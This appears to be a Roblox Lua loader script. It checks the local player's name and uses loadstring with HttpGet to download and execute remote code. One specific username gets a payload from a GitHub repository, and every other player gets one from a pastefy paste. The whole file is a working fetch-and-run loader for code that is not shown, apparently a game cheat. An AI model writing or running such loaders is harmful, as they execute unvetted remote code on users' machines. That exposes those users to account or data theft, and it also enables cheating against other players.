local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

if localPlayer then
    -- Converts the player's name to all lowercase before checking
    if string.lower(localPlayer.Name) == "dylancuriae25" then
        -- Execute this if the user is dylancuriae25 (case-insensitive)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/annan1310/gag2/refs/heads/main/starspawner"))()
    else
        -- Execute this if the user is NOT dylancuriae25
        loadstring(game:HttpGet("https://pastefy.app/1vXhvgdU/raw"))()
    end
else
    warn("LocalPlayer not found.")
end
